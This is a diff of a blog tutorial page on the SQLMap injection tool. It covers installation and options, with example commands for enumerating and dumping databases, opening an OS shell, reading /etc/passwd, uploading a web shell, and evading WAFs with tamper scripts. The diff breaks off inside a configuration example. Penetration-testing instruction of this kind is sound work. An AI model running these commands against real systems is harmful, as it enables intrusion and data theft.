@@ -7,9 +7,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
 <meta name="author" content="Xu Haiyang">
-<meta name="dcterms.date" content="2025-03-06">
+<meta name="dcterms.date" content="2025-03-11">
 
-<title>sqlmap – Haiyang's Tech Portfolio</title>
+<title>SQLMap: Automated SQL Injection Detection and Exploitation Tool – Haiyang’s Tech Portfolio</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -21,6 +21,40 @@ ul.task-list li input[type="checkbox"] {
   width: 0.8em;
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
 }
 </style>
 
@@ -155,14 +189,68 @@ ul.task-list li input[type="checkbox"] {
 <div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
 <!-- sidebar -->
 <!-- margin-sidebar -->
-    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
-        
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">Contents</h2>
+   
+  <ul>
+  <li><a href="#introduction-to-sqlmap" id="toc-introduction-to-sqlmap" class="nav-link active" data-scroll-target="#introduction-to-sqlmap">Introduction to SQLMap</a></li>
+  <li><a href="#key-features" id="toc-key-features" class="nav-link" data-scroll-target="#key-features">Key Features</a>
+  <ul class="collapse">
+  <li><a href="#database-support" id="toc-database-support" class="nav-link" data-scroll-target="#database-support">Database Support</a></li>
+  <li><a href="#injection-techniques" id="toc-injection-techniques" class="nav-link" data-scroll-target="#injection-techniques">Injection Techniques</a></li>
+  <li><a href="#advanced-features" id="toc-advanced-features" class="nav-link" data-scroll-target="#advanced-features">Advanced Features</a></li>
+  </ul></li>
+  <li><a href="#installation-and-setup" id="toc-installation-and-setup" class="nav-link" data-scroll-target="#installation-and-setup">Installation and Setup</a>
+  <ul class="collapse">
+  <li><a href="#installation-methods" id="toc-installation-methods" class="nav-link" data-scroll-target="#installation-methods">Installation Methods</a></li>
+  <li><a href="#prerequisites" id="toc-prerequisites" class="nav-link" data-scroll-target="#prerequisites">Prerequisites</a></li>
+  </ul></li>
+  <li><a href="#basic-usage" id="toc-basic-usage" class="nav-link" data-scroll-target="#basic-usage">Basic Usage</a>
+  <ul class="collapse">
+  <li><a href="#command-structure" id="toc-command-structure" class="nav-link" data-scroll-target="#command-structure">Command Structure</a></li>
+  <li><a href="#essential-options" id="toc-essential-options" class="nav-link" data-scroll-target="#essential-options">Essential Options</a></li>
+  <li><a href="#getting-help" id="toc-getting-help" class="nav-link" data-scroll-target="#getting-help">Getting Help</a></li>
+  </ul></li>
+  <li><a href="#practical-examples" id="toc-practical-examples" class="nav-link" data-scroll-target="#practical-examples">Practical Examples</a>
+  <ul class="collapse">
+  <li><a href="#example-1-basic-url-testing" id="toc-example-1-basic-url-testing" class="nav-link" data-scroll-target="#example-1-basic-url-testing">Example 1: Basic URL Testing</a></li>
+  <li><a href="#example-2-testing-with-http-post-data" id="toc-example-2-testing-with-http-post-data" class="nav-link" data-scroll-target="#example-2-testing-with-http-post-data">Example 2: Testing with HTTP POST Data</a></li>
+  <li><a href="#example-3-testing-with-cookies" id="toc-example-3-testing-with-cookies" class="nav-link" data-scroll-target="#example-3-testing-with-cookies">Example 3: Testing with Cookies</a></li>
+  <li><a href="#example-4-database-enumeration" id="toc-example-4-database-enumeration" class="nav-link" data-scroll-target="#example-4-database-enumeration">Example 4: Database Enumeration</a></li>
+  <li><a href="#example-5-advanced-exploitation" id="toc-example-5-advanced-exploitation" class="nav-link" data-scroll-target="#example-5-advanced-exploitation">Example 5: Advanced Exploitation</a></li>
+  </ul></li>
+  <li><a href="#advanced-sqlmap-techniques" id="toc-advanced-sqlmap-techniques" class="nav-link" data-scroll-target="#advanced-sqlmap-techniques">Advanced SQLMap Techniques</a>
+  <ul class="collapse">
+  <li><a href="#bypassing-wafips" id="toc-bypassing-wafips" class="nav-link" data-scroll-target="#bypassing-wafips">Bypassing WAF/IPS</a></li>
+  <li><a href="#using-sqlmap-with-burp-suite" id="toc-using-sqlmap-with-burp-suite" class="nav-link" data-scroll-target="#using-sqlmap-with-burp-suite">Using SQLMap with Burp Suite</a></li>
+  <li><a href="#batch-processing" id="toc-batch-processing" class="nav-link" data-scroll-target="#batch-processing">Batch Processing</a></li>
+  </ul></li>
+  <li><a href="#sqlmap-configuration" id="toc-sqlmap-configuration" class="nav-link" data-scroll-target="#sqlmap-configuration">SQLMap Configuration</a>
+  <ul class="collapse">
+  <li><a href="#example-configuration-file" id="toc-example-configuration-file" class="nav-link" data-scroll-target="#example-configuration-file">Example Configuration File</a></li>
+  <li><a href="#performance-tuning" id="toc-performance-tuning" class="nav-link" data-scroll-target="#performance-tuning">Performance Tuning</a></li>
+  </ul></li>
+  <li><a href="#defensive-measures-against-sql-injection" id="toc-defensive-measures-against-sql-injection" class="nav-link" data-scroll-target="#defensive-measures-against-sql-injection">Defensive Measures Against SQL Injection</a>
+  <ul class="collapse">
+  <li><a href="#prevention-techniques" id="toc-prevention-techniques" class="nav-link" data-scroll-target="#prevention-techniques">Prevention Techniques</a></li>
+  </ul></li>
+  <li><a href="#comparing-sqlmap-with-other-sql-injection-tools" id="toc-comparing-sqlmap-with-other-sql-injection-tools" class="nav-link" data-scroll-target="#comparing-sqlmap-with-other-sql-injection-tools">Comparing SQLMap with Other SQL Injection Tools</a></li>
+  <li><a href="#case-study-real-world-sqlmap-usage" id="toc-case-study-real-world-sqlmap-usage" class="nav-link" data-scroll-target="#case-study-real-world-sqlmap-usage">Case Study: Real-World SQLMap Usage</a>
+  <ul class="collapse">
+  <li><a href="#scenario-security-assessment-of-a-web-application" id="toc-scenario-security-assessment-of-a-web-application" class="nav-link" data-scroll-target="#scenario-security-assessment-of-a-web-application">Scenario: Security Assessment of a Web Application</a></li>
+  </ul></li>
+  <li><a href="#conclusion" id="toc-conclusion" class="nav-link" data-scroll-target="#conclusion">Conclusion</a></li>
+  <li><a href="#resources-for-further-learning" id="toc-resources-for-further-learning" class="nav-link" data-scroll-target="#resources-for-further-learning">Resources for Further Learning</a></li>
+  </ul>
+</nav>
     </div>
 <!-- main -->
 <main class="content" id="quarto-document-content">
 
 <header id="title-block-header" class="quarto-title-block default">
 <div class="quarto-title">
+<h1 class="title">SQLMap: Automated SQL Injection Detection and Exploitation Tool</h1>
   <div class="quarto-categories">
     <div class="quarto-category">Exploitation</div>
   </div>
@@ -182,7 +270,7 @@ ul.task-list li input[type="checkbox"] {
     <div>
     <div class="quarto-title-meta-heading">Published</div>
     <div class="quarto-title-meta-contents">
-      <p class="date">March 6, 2025</p>
+      <p class="date">March 11, 2025</p>
     </div>
   </div>
   
@@ -194,8 +282,491 @@ ul.task-list li input[type="checkbox"] {
 </header>
 
 
+<section id="introduction-to-sqlmap" class="level2">
+<h2 class="anchored" data-anchor-id="introduction-to-sqlmap">Introduction to SQLMap</h2>
+<p>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in database servers. Since its initial release in 2006, SQLMap has become one of the most powerful and widely used tools for database security assessment.</p>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/400.png" class="img-fluid figure-img"></p>
+<figcaption>SQLMap Banner</figcaption>
+</figure>
+</div>
+<p>SQLMap automates the process of detecting and exploiting SQL injection flaws, with support for a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and many others.</p>
+<div class="callout callout-style-default callout-important callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Important
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p><strong>Important:</strong> SQLMap should only be used against systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.</p>
+</div>
+</div>
+</section>
+<section id="key-features" class="level2">
+<h2 class="anchored" data-anchor-id="key-features">Key Features</h2>
+<p>SQLMap offers a comprehensive set of features that make it an indispensable tool for security professionals:</p>
+<section id="database-support" class="level3">
+<h3 class="anchored" data-anchor-id="database-support">Database Support</h3>
+<p>SQLMap supports virtually all major database management systems:</p>
+<ul>
+<li>MySQL</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+<li>Microsoft SQL Server</li>
+<li>SQLite</li>
+<li>IBM DB2</li>
+<li>SAP MaxDB</li>
+<li>Microsoft Access</li>
+<li>Firebird</li>
+<li>Sybase</li>
+<li>HSQLDB</li>
+<li>Informix</li>
+<li>H2</li>
+<li>MonetDB</li>
+<li>Apache Derby</li>
+<li>Vertica</li>
+<li>Mckoi</li>
+<li>Presto</li>
+<li>Altibase</li>
+<li>MimerSQL</li>
+<li>CrateDB</li>
+<li>Greenplum</li>
+<li>Drizzle</li>
+<li>Apache Ignite</li>
+<li>Cubrid</li>
+<li>InterSystems Cache</li>
+<li>IRIS</li>
+<li>eXtremeDB</li>
+<li>FrontBase</li>
+</ul>
+</section>
+<section id="injection-techniques" class="level3">
+<h3 class="anchored" data-anchor-id="injection-techniques">Injection Techniques</h3>
+<p>SQLMap employs various SQL injection techniques:</p>
+<ul>
+<li>Boolean-based blind</li>
+<li>Time-based blind</li>
+<li>Error-based</li>
+<li>UNION query-based</li>
+<li>Stacked queries</li>
+<li>Out-of-band</li>
+</ul>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>SQLMap Injection Techniques</figcaption>
+</figure>
+</div>
+</section>
+<section id="advanced-features" class="level3">
+<h3 class="anchored" data-anchor-id="advanced-features">Advanced Features</h3>
+<ul>
+<li>Database fingerprinting</li>
+<li>Data extraction from the database</li>
+<li>Access to the underlying file system</li>
+<li>Command execution on the database server</li>
+<li>Registry manipulation (Windows)</li>
+<li>Password hash cracking</li>
+<li>Privilege escalation</li>
+<li>Establishing an interactive shell</li>
+</ul>
+</section>
+</section>
+<section id="installation-and-setup" class="level2">
+<h2 class="anchored" data-anchor-id="installation-and-setup">Installation and Setup</h2>
+<p>SQLMap is easy to install and comes pre-installed on many security-focused Linux distributions like Kali Linux.</p>
+<section id="installation-methods" class="level3">
+<h3 class="anchored" data-anchor-id="installation-methods">Installation Methods</h3>
+<section id="method-1-using-git" class="level4">
+<h4 class="anchored" data-anchor-id="method-1-using-git">Method 1: Using Git</h4>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Clone the SQLMap repository</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone <span class="at">--depth</span> 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Navigate to the directory</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> sqlmap-dev</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Run SQLMap</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> sqlmap.py</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="method-2-using-package-managers" class="level4">
+<h4 class="anchored" data-anchor-id="method-2-using-package-managers">Method 2: Using Package Managers</h4>
+<p>On Kali Linux:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install sqlmap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>On Arch Linux:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> pacman <span class="at">-S</span> sqlmap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Using pip:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip</span> install sqlmap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="prerequisites" class="level3">
+<h3 class="anchored" data-anchor-id="prerequisites">Prerequisites</h3>
+<ul>
+<li>Python 2.7.x or Python 3.x</li>
+<li>Required Python modules (automatically installed on most systems)</li>
+</ul>
+</section>
+</section>
+<section id="basic-usage" class="level2">
+<h2 class="anchored" data-anchor-id="basic-usage">Basic Usage</h2>
+<p>SQLMap operates primarily through command-line arguments. Here’s how to get started:</p>
+<section id="command-structure" class="level3">
+<h3 class="anchored" data-anchor-id="command-structure">Command Structure</h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> sqlmap.py <span class="pp">[</span><span class="ss">options</span><span class="pp">]</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="essential-options" class="level3">
+<h3 class="anchored" data-anchor-id="essential-options">Essential Options</h3>
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>-u URL, --url=URL</code></td>
+<td>Target URL</td>
+</tr>
+<tr class="even">
+<td><code>-d DIRECT</code></td>
+<td>Direct connection to the database</td>
+</tr>
+<tr class="odd">
+<td><code>-r REQUESTFILE</code></td>
+<td>Load HTTP request from a file</td>
+</tr>
+<tr class="even">
+<td><code>-g GOOGLEDORK</code></td>
+<td>Process Google dork results as target URLs</td>
+</tr>
+<tr class="odd">
+<td><code>-p TESTPARAMETER</code></td>
+<td>Testable parameter(s)</td>
+</tr>
+<tr class="even">
+<td><code>--data=DATA</code></td>
+<td>Data string to be sent through POST</td>
+</tr>
+<tr class="odd">
+<td><code>--cookie=COOKIE</code></td>
+<td>HTTP Cookie header value</td>
+</tr>
+<tr class="even">
+<td><code>--user-agent=AGENT</code></td>
+<td>HTTP User-Agent header value</td>
+</tr>
+<tr class="odd">
+<td><code>--random-agent</code></td>
+<td>Use a random HTTP User-Agent header</td>
+</tr>
+<tr class="even">
+<td><code>--proxy=PROXY</code></td>
+<td>Use a proxy to connect to the target URL</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="getting-help" class="level3">
+<h3 class="anchored" data-anchor-id="getting-help">Getting Help</h3>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Display basic help</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> sqlmap.py <span class="at">-h</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Display advanced help</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> sqlmap.py <span class="at">-hh</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="practical-examples" class="level2">
+<h2 class="anchored" data-anchor-id="practical-examples">Practical Examples</h2>
+<section id="example-1-basic-url-testing" class="level3">
+<h3 class="anchored" data-anchor-id="example-1-basic-url-testing">Example 1: Basic URL Testing</h3>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--dbs</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This command tests the “id” parameter for SQL injection vulnerabilities and attempts to retrieve the list of databases if successful.</p>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>SQLMap Basic URL Testing</figcaption>
+</figure>
+</div>
+</section>
+<section id="example-2-testing-with-http-post-data" class="level3">
+<h3 class="anchored" data-anchor-id="example-2-testing-with-http-post-data">Example 2: Testing with HTTP POST Data</h3>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/login.php"</span> <span class="at">--data</span><span class="op">=</span><span class="st">"username=admin&amp;password=test"</span> <span class="at">-p</span> username</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This tests the “username” parameter in the POST data for SQL injection vulnerabilities.</p>
+</section>
+<section id="example-3-testing-with-cookies" class="level3">
+<h3 class="anchored" data-anchor-id="example-3-testing-with-cookies">Example 3: Testing with Cookies</h3>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/member.php"</span> <span class="at">--cookie</span><span class="op">=</span><span class="st">"PHPSESSID=1234567890abcdef"</span> <span class="at">--level</span><span class="op">=</span>3</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This tests the cookies for SQL injection vulnerabilities with a higher level of detection.</p>
+</section>
+<section id="example-4-database-enumeration" class="level3">
+<h3 class="anchored" data-anchor-id="example-4-database-enumeration">Example 4: Database Enumeration</h3>
+<p>Once a vulnerability is found, you can enumerate the database structure:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># List databases</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--dbs</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="co"># List tables in a specific database</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">-D</span> database_name <span class="at">--tables</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="co"># List columns in a specific table</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">-D</span> database_name <span class="at">-T</span> table_name <span class="at">--columns</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Dump data from a specific table</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">-D</span> database_name <span class="at">-T</span> table_name <span class="at">--dump</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<pre class="mermaid"><code>graph TD
+    A[Find Injection Point] --&gt; B[Enumerate Databases]
+    B --&gt; C[Enumerate Tables]
+    C --&gt; D[Enumerate Columns]
+    D --&gt; E[Extract Data]
+    E --&gt; F[Advanced Exploitation]</code></pre>
+</section>
+<section id="example-5-advanced-exploitation" class="level3">
+<h3 class="anchored" data-anchor-id="example-5-advanced-exploitation">Example 5: Advanced Exploitation</h3>
+<p>SQLMap can also be used for more advanced exploitation:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Execute OS commands</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--os-shell</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Access the file system</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--file-read</span><span class="op">=</span><span class="st">"/etc/passwd"</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Upload files</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--file-write</span><span class="op">=</span><span class="st">"shell.php"</span> <span class="at">--file-dest</span><span class="op">=</span><span class="st">"/var/www/html/shell.php"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="advanced-sqlmap-techniques" class="level2">
+<h2 class="anchored" data-anchor-id="advanced-sqlmap-techniques">Advanced SQLMap Techniques</h2>
+<section id="bypassing-wafips" class="level3">
+<h3 class="anchored" data-anchor-id="bypassing-wafips">Bypassing WAF/IPS</h3>
+<p>Web Application Firewalls (WAF) and Intrusion Prevention Systems (IPS) can sometimes block SQLMap’s attacks. Here are some techniques to bypass them:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Using a tamper script</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--tamper</span><span class="op">=</span>between,space2comment,randomcase</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Using a random User-Agent</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--random-agent</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Using a delay between requests</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--delay</span><span class="op">=</span>2</span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Using a different technique</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--technique</span><span class="op">=</span>T</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="callout callout-style-default callout-tip callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Tip
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>SQLMap includes dozens of tamper scripts that can help bypass WAF/IPS protections. You can list them using <code>sqlmap --list-tampers</code>.</p>
+</div>
+</div>
+</section>
+<section id="using-sqlmap-with-burp-suite" class="level3">
+<h3 class="anchored" data-anchor-id="using-sqlmap-with-burp-suite">Using SQLMap with Burp Suite</h3>
+<p>SQLMap can be integrated with Burp Suite for more comprehensive testing:</p>
+<ol type="1">
+<li>Capture the request in Burp Suite</li>
+<li>Save the request to a file</li>
+<li>Use SQLMap’s <code>-r</code> option to test the request</li>
+</ol>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-r</span> request.txt <span class="at">--dbs</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>SQLMap with Burp Suite</figcaption>
+</figure>
+</div>
+</section>
+<section id="batch-processing" class="level3">
+<h3 class="anchored" data-anchor-id="batch-processing">Batch Processing</h3>
+<p>For testing multiple targets, SQLMap offers batch processing capabilities:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Create a list of targets</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"http://example1.com/page.php?id=1"</span> <span class="op">&gt;</span> targets.txt</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"http://example2.com/page.php?id=1"</span> <span class="op">&gt;&gt;</span> targets.txt</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Test all targets</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-m</span> targets.txt <span class="at">--dbs</span> <span class="at">--batch</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="sqlmap-configuration" class="level2">
+<h2 class="anchored" data-anchor-id="sqlmap-configuration">SQLMap Configuration</h2>
+<p>SQLMap can be customized through a configuration file (<code>sqlmap.conf</code>) or through command-line options.</p>
+<section id="example-configuration-file" class="level3">
+<h3 class="anchored" data-anchor-id="example-configuration-file">Example Configuration File</h3>
+<div class="sourceCode" id="cb16"><pre class="sourceCode ini code-with-copy"><code class="sourceCode ini"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">[Target]</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="dt">url </span><span class="ot">=</span><span class="st"> http://example.com/page.php?id=1</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="dt">data </span><span class="ot">=</span><span class="st"> </span></span>
